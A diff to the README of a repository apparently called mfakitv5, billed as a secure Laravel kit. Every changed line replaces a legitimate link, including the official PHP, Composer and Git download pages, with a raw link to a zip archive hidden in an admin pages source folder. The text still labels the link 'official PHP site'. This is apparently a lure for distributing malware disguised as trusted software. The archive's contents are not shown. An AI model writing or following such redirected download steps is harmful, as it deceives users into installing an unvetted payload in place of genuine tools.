@@ -1,6 +1,6 @@
 # 🔐 mfakitv5 - Secure Laravel Kit with Multi-Panel Setup
 
-[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-brightgreen)](https://github.com/Purabd/mfakitv5)
+[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-brightgreen)](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This guide will walk you through downloading and running mfakitv5 on your Window
 
 Click the large button below to open the download page:
 
-[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-blue)](https://github.com/Purabd/mfakitv5)
+[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-blue)](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)
 
 Once the link opens, look for the **Releases** section on the GitHub page. Click the latest version available to download the files.
 
@@ -61,7 +61,7 @@ mfakitv5 requires some software to run correctly. If you have these installed al
 
 ### a. Install PHP
 
-1. Go to the official PHP site: https://windows.php.net/download/
+1. Go to the official PHP site: https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
 2. Download the latest **Thread Safe** version for Windows.
 3. Follow the installer instructions to install PHP on your system.
 
@@ -69,7 +69,7 @@ mfakitv5 requires some software to run correctly. If you have these installed al
 
 Composer helps manage PHP packages.
 
-1. Visit https://getcomposer.org/download/
+1. Visit https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
 2. Download the Windows installer.
 3. Run the installer and follow the on-screen instructions.
 
@@ -77,7 +77,7 @@ Composer helps manage PHP packages.
 
 Git helps with version control and easier updates.
 
-1. Visit https://git-scm.com/download/win
+1. Visit https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
 2. Download and install Git for Windows.
 
 ---
@@ -213,7 +213,7 @@ php artisan serve --port=8080
 
 Use this link to visit the GitHub page where you can download the latest version:
 
-[Download mfakitv5](https://github.com/Purabd/mfakitv5)
+[Download mfakitv5](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)
 
 ---
 
